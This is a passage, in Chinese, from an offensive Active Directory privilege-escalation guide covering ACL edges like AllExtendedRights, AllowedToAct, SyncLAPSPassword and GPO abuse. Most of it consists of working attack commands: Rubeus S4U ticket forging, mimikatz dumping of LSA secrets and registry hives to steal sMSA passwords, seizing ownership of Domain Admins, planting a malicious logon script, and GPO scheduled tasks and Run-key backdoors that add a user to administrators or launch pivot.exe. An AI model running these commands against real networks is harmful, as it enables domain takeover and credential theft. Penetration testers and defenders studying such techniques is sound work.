$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()
```

## AllExtendedRights

扩展权限是授予对象的特殊权限，允许读取特权属性以及执行特殊操作。

+ 滥用信息

**用户**

拥有此权限的用户将能够重置用户的密码。有关详细信息，请参阅 ForceChangePassword 边缘部分

**电脑**

您可以使用此权限对计算机对象执行基于资源的约束委派。有关详细信息，请参阅 GenericAll 边缘部分。

**域** AllExtendedRights 权限授予 DS-Replication-Get-Changes 和 DS-Replication-Get-Changes-All 权限，这两个权限组合起来允许主体从域复制对象。使用 mimikatz 中的 lsadump::dcsync 命令可以滥用此功能。

## GPLink

链接的 GPO 将其设置应用于链接容器中的对象。

+ 滥用信息

此边缘可帮助您了解 GPO 适用于哪个对象，因此实际滥用实际上是针对此边缘源自的 GPO 执行的。有关滥用的详细信息，请参阅 GenericAll 边缘部分，了解何时您可以完全控制 GPO。

参考

https://wald0.com/?p=179

## AllowedToAct

攻击者可以使用此帐户执行修改后的 S4U2self/S4U2proxy 滥用链，以模拟目标计算机系统的任何域用户，并“作为”该用户接收有效的服务票证。

需要注意的是，模拟用户不能位于“受保护用户”安全组中，否则委派权限将被撤销。另一个需要注意的是，添加到 msDS-AllowedToActOnBehalfOfOtherIdentity DACL 的主体*必须*设置服务主体名称 (SPN)，才能成功滥用 S4U2self/S4U2proxy 进程。如果攻击者当前未控制具有 SPN 集的帐户，则攻击者可以滥用默认域 MachineAccountQuota 设置来添加攻击者通过 Powermad 项目控制的计算机帐户。

+ 滥用信息

目前只能通过 Rubeus 项目滥用此原语。

要使用此攻击，受控帐户必须设置服务主体名称，以及对帐户的明文或 RC4_HMAC 哈希的访问权限。

如果明文密码可用，您可以使用 Rubeus 将其哈希为 RC4_HMAC 版本：

```
Rubeus.exe hash /password:Summer2018!
```

使用 Rubeus 的*s4u*模块获取我们想要“假装”为“admin”的服务名称 (sname) 的服务票证。该票证被注入（感谢 /ptt），在本例中授予我们对目标计算机文件系统的访问权限：

```
Rubeus.exe s4u /user:<trusted user> /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt
```

## AddAllowedToAct

修改 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的能力允许攻击者滥用基于资源的约束委派来危害远程计算机系统。此属性是一个二进制 DACL，它控制哪些安全主体可以假装是特定计算机对象的任何域用户。

+ 滥用信息

有关滥用信息，请参阅“AllowedToAct”边缘部分

## WriteAccountRestrictions

此边缘指示主体能够写入并修改目标主体上的多个属性，最显着的是 msDS-AllowedToActOnBehalfOfOtherIdentity 属性。修改 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的能力允许攻击者滥用基于资源的约束委派来危害远程计算机系统。此属性是一个二进制 DACL，它控制哪些安全主体可以假装是特定计算机对象的任何域用户。

+ 滥用信息

有关滥用信息，请参阅“AllowedToAct”边缘部分

## TrustedBy

该边用于跟踪域信任，并映射到访问方向。

+ 滥用信息

当分析如何跳过林信任以从林内的域管理员访问权限获取企业管理员访问权限时，此优势将派上用场。有关该攻击的更多信息，请参阅https://blog.harmj0y.net/redteaming/the-trustpocalypse/

## SyncLAPSPassword

具有此权限的主体表示能够通过目录同步检索机密和 RODC 过滤属性的值，例如 LAPS 的*ms-Mcs-AdmPwd*。

+ 滥用信息

要滥用这些权限，请使用 DirSync：
https://github.com/simondotsh/DirSync

```
Sync-LAPS -LDAPFilter '(samaccountname=TargetComputer$)'
```

有关其他可选参数，请查看 DirSync 文档。

## DumpSMSAPassword

具有此信息的计算机表明其上安装了独立托管服务帐户 (sMSA)。具有计算机管理权限的参与者可以通过转储 LSA 机密来检索 sMSA 的密码。

+ 滥用信息

从 sMSA 所在计算机上的提升命令提示符运行 mimikatz，然后执行以下命令：

```
privilege::debug
token::elevate
lsadump::secrets
```

在输出中，找到*_SC_{262E99C9-6160-4871-ACEC-4E61736B6F21}_，*后缀为目标 sMSA 的名称。下一行包含*cur/hex ：*后跟 sMSA 的十六进制编码密码。

要使用此密码，必须计算其 NT 哈希值。这可以使用一个小的 python 脚本来完成：

```
# nt.py
import sys, hashlib

pw_hex = sys.argv[1]
nt_hash = hashlib.new('md4', bytes.fromhex(pw_hex)).hexdigest()

print(nt_hash)
```

像这样执行它：

```
python3 nt.py 35f3e1713d61...
```

要进行 sMSA 身份验证，请利用哈希传递。

或者，为了避免在主机上执行 mimikatz，您可以从提升的提示符下保存*SYSTEM*和*SECURITY注册表配置单元的副本：*

```
reg save HKLM\SYSTEM %temp%\SYSTEM & reg save HKLM\SECURITY %temp%\SECURITY
```

将保存在*%temp%的名为**SYSTEM*和*SECURITY*的文件传输到另一台可以安全执行 mimikatz 的计算机上。

在另一台计算机上，从命令提示符运行 mimikatz，然后执行以下命令以获取十六进制编码的密码：

```
lsadump::secrets /system:C:\path\to\file\SYSTEM /security:C:\path\to\file\SECURITY
```

## ObjectType

+ ObjectType:All

```
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```

如果用户spotless对`Domain Admins`组有权限`ObjectType:All`, 那么可以将Domain Admins对象的所有者更改为我们的用户spotless

```
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
//您也可以使用SID的名称
Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity spotless
```

然后再把用户spotless添加到Domain Admins组,从而拥有域管权限

+ ObjectType:Script-Path

```
Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
ObjectType上的WriteProperty（在本例中为Script Path）允许攻击者`spotless`覆盖委托用户`delegate`的登录脚本路径，这意味着下次用户委托登录时，他们的系统将执行我们的恶意脚本：
```
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

## GPO

+ 查看用户`spotless`对所有GPO的权限

```
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

+ 应用了给定策略的计算机

我们现在可以解析GPO错误配置策略应用于的计算机名称：

```
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```

+ 应用于给定计算机的策略
```
Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
```
+ 应用了给定策略的 OU
```
Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties DistinguishedN
```

### **滥用 GPO -**  [New- ](https://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1)

滥用这种错误配置并执行代码的方法之一是通过 GPO 创建立即计划任务，如下所示：
```
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
![img](https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-M0xK_5m5MJbbcNHZ2Jc%2F-M0xO_cwVE8KZZgUViP7%2Fa19.png?alt=media&token=e84fda37-9f04-41a3-8e37-ae1a54f5d308)

`administrators`上面的代码会将我们的用户spotless添加到受感染机器的本地组中。请注意，在代码执行之前，组不包含 user `spotless`：

![img](https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-M0xK_5m5MJbbcNHZ2Jc%2F-M0xOdaIumZqlVbsM9jj%2Fa20.png?alt=media&token=5762f200-26a4-4420-8157-05ec31f5f5a8)

### GroupPolicy 模块**- 滥用 GPO**

您可以检查 GroupPolicy 模块是否随`Get-Module -List -Name GroupPolicy | select -expand ExportedCommands`. 在紧要关头，您可以`Install-WindowsFeature –Name GPMC`以本地管理员身份安装它。
```
\# Create new GPO and link it with the OU Workstrations

New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"

\# Make the computers inside Workstrations create a new reg key that will execute a backdoor

\## Search a shared folder where you can write and all the computers affected can read

Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
更新 GPO 后，此有效负载还需要有人登录计算机内部。

### [**SharpGPOAbuse**](https://github.com/FSecureLABS/SharpGPOAbuse) **- 滥用 GPO** 

它无法创建 GPO，因此我们仍然必须使用 RSAT 来创建 GPO，或者修改我们已经具有写访问权限的 GPO。
```
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### 强制政策更新

以前滥用的**GPO 更新大约每 90 分钟重新加载**一次。 如果您有权访问计算机，则可以使用 强制执行`gpupdate /force`。

### 在引擎盖下

如果我们观察 GPO 的计划任务`Misconfigured Policy`，我们可以看到我们`evilTask`坐在那里：

![img](https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-M0xK_5m5MJbbcNHZ2Jc%2F-M0xOngBtFZIPTysFBXx%2Fa22.png?alt=media&token=22ac62cf-8c26-4763-8fbf-2fa9c9dccd67)

下面是创建的 XML 文件，`New-GPOImmediateTask`它代表了 GPO 中我们邪恶的计划任务：

\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
```
<?xml version="1.0" encoding="utf-8"?>

<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">

​    <ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="evilTask" image="0" changed="2018-11-20 13:43:43" uid="{6cc57eac-b758-4c52-825d-e21480bbb47f}" userContext="0" removePolicy="0">

​        <Properties action="C" name="evilTask" runAs="NT AUTHORITY\System" logonType="S4U">

​            <Task version="1.3">

​                <RegistrationInfo>

​                    <Author>NT AUTHORITY\System</Author>

​                    <Description></Description>

​                </RegistrationInfo>

​                <Principals>

​                    <Principal id="Author">

​                        <UserId>NT AUTHORITY\System</UserId>

​                        <RunLevel>HighestAvailable</RunLevel>

​                        <LogonType>S4U</LogonType>

​                    </Principal>

​                </Principals>

​                <Settings>

​                    <IdleSettings>

​                        <Duration>PT10M</Duration>

​                        <WaitTimeout>PT1H</WaitTimeout>

​                        <StopOnIdleEnd>true</StopOnIdleEnd>

​                        <RestartOnIdle>false</RestartOnIdle>

​                    </IdleSettings>

​                    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>

​                    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>

​                    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>

​                    <AllowHardTerminate>false</AllowHardTerminate>

​                    <StartWhenAvailable>true</StartWhenAvailable>

​                    <AllowStartOnDemand>false</AllowStartOnDemand>

​                    <Enabled>true</Enabled>

​                    <Hidden>true</Hidden>

​                    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>

​                    <Priority>7</Priority>

​                    <DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>

​                    <RestartOnFailure>

​                        <Interval>PT15M</Interval>

​                        <Count>3</Count>

​                    </RestartOnFailure>

​                </Settings>

​                <Actions Context="Author">

​                    <Exec>

​                        <Command>cmd</Command>

​                        <Arguments>/c net localgroup administrators spotless /add</Arguments>

​                    </Exec>

​                </Actions>

​                <Triggers>

​                    <TimeTrigger>

​                        <StartBoundary>%LocalTimeXmlEx%</StartBoundary>

​                        <EndBoundary>%LocalTimeXmlEx%</EndBoundary>

​                        <Enabled>true</Enabled>

​                    </TimeTrigger>

​                </Triggers>

​            </Task>

​        </Properties>

​    </ImmediateTaskV2>

</ScheduledTasks>
```
### 用户和组

通过滥用 GPO 用户和组功能也可以实现相同的权限升级。请注意，在下面的文件中，第 6 行将用户`spotless`添加到本地`administrators`组 - 我们可以将用户更改为其他用户，添加另一个用户，甚至将用户添加到另一个组/多个组，因为我们可以修改策略配置文件由于分配给我们的用户的 GPO 委托而显示的位置`spotless`：

\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\Groups
```
<?xml version="1.0" encoding="utf-8"?>

<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">

​    <Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators (built-in)" image="2" changed="2018-12-20 14:08:39" uid="{300BCC33-237E-4FBA-8E4D-D8C3BE2BB836}">

​        <Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators (built-in)">

​            <Members>

​                <Member name="spotless" action="ADD" sid="" />

​            </Members>

​        </Properties>

​    </Group>

</Groups>
```
此外，我们可以考虑利用登录/注销脚本、使用注册表进行自动运行、安装 .msi、编辑服务和类似的代码执行途径。